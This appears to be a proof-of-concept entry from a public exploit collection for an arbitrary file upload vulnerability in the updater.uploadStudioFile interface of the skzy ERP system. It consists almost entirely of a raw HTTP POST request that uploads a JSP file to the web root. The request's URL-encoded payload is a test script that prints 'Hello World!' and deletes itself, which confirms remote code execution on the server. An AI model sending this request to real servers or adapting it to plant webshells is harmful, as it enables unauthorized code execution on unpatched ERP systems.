# skzyERP_updater.uploadStudioFile_fileupload

from: https://github.com/wy876/POC/blob/main/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8BERP%E7%B3%BB%E7%BB%9Fupdater.uploadStudioFile%E6%8E%A5%E5%8F%A3%E5%A4%84%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md

2024.7.1

```
POST /formservice?service=updater.uploadStudioFile HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 1098
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close

content=<?xml%20version="1.0"?><root><filename>ceshi.jsp</filename><filepath>./</filepath><filesize>172</filesize><lmtime>1970-01-01%2008:00:00</lmtime></root><!--%3c%25%20%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%22%48%65%6c%6c%6f%20%57%6f%72%6c%64%21%22%29%3b%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%46%69%6c%65%28%61%70%70%6c%69%63%61%74%69%6f%6e%2e%67%65%74%52%65%61%6c%50%61%74%68%28%72%65%71%75%65%73%74%2e%67%65%74%53%65%72%76%6c%65%74%50%61%74%68%28%29%29%29%2e%64%65%6c%65%74%65%28%29%3b%20%25%3e-->
```
